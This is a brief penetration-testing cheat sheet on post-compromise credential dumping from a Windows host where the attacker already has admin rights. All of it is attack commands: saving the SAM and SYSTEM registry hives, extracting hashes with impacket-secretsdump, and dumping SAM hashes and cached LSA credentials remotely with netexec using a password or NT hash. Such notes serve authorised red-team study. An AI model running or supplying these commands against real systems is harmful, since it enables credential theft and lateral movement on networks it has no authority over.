# Post-Compromise Enumeration

## Admin Access on host

Dump SAM

```
# local method
reg save HKLM\SAM path\sam.hiv

reg save HKLM\SYSTEM path\system.hiv

impacket-secretsdump --sam sam.hiv --system system.hiv LOCAL

# netexec method
netexec smb -u <adminuser> -p <password> --sam

netexec smb -u <adminuser> -H <nt-hash> --sam
```

Dump cached creds LSA
```
netexec smb -u <adminuser> -p <password> --lsa
```